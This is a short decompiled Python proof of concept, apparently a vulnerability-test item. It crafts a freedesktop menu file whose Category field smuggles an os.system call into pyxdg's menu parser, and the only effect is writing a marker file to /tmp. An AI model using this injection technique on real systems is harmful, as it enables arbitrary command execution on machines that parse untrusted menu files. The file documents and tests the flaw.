# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 92_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 701 bytes
import xdg.Menu
xml = '<!DOCTYPE Menu PUBLIC "-//freedesktop//DTD Menu 1.0//EN"\n"http://www.freedesktop.org/standards/menu-spec/1.0/menu.dtd">\n<Menu>\n<LegacyDir>/tmp</LegacyDir>\n<Include>\n<Category>\' or __import__(\'os\').system(\'echo hacked > /tmp/result.txt\') or \'</Category>\n</Include>\n</Menu>\n'
with open("/tmp/malicious.menu", "w") as f:
    f.write(xml)
menu = xdg.Menu.parse("/tmp/malicious.menu")

# okay decompiling 92_1.pyc
